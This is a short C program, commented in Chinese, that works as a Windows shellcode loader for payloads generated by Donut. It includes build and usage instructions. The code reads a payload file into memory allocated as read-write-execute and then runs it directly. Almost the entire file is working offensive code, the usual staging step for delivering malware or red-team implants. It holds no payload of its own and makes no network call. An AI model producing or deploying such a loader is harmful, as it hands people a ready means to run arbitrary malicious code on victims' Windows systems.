/*
 * Simple Shellcode Loader
 * 用于加载 Donut 生成的 shellcode
 * 
 * 编译方法 (Visual Studio Developer Command Prompt):
 *   cl.exe /O2 /MT /Fe:loader.exe loader.c
 * 
 * 使用方法:
 *   loader.exe payload.bin
 */

#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <shellcode.bin>\n", argv[0]);
        printf("Example: loader.exe payload.bin\n");
        return 1;
    }

    const char* filename = argv[1];
    
    // 打开文件
    HANDLE hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, 
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open file: %s (Error: %lu)\n", filename, GetLastError());
        return 1;
    }

    // 获取文件大小
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        printf("[!] Invalid file size\n");
        CloseHandle(hFile);
        return 1;
    }

    printf("[*] Shellcode size: %lu bytes\n", fileSize);

    // 分配可执行内存
    LPVOID execMem = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMem == NULL) {
        printf("[!] VirtualAlloc failed (Error: %lu)\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    printf("[*] Allocated memory at: 0x%p\n", execMem);

    // 读取 shellcode 到内存
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, execMem, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[!] Failed to read file (Error: %lu)\n", GetLastError());
        VirtualFree(execMem, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return 1;
    }

    CloseHandle(hFile);

    printf("[*] Shellcode loaded, executing...\n");

    // 执行 shellcode
    ((void(*)())execMem)();

    // 通常不会执行到这里
    VirtualFree(execMem, 0, MEM_RELEASE);
    return 0;
}
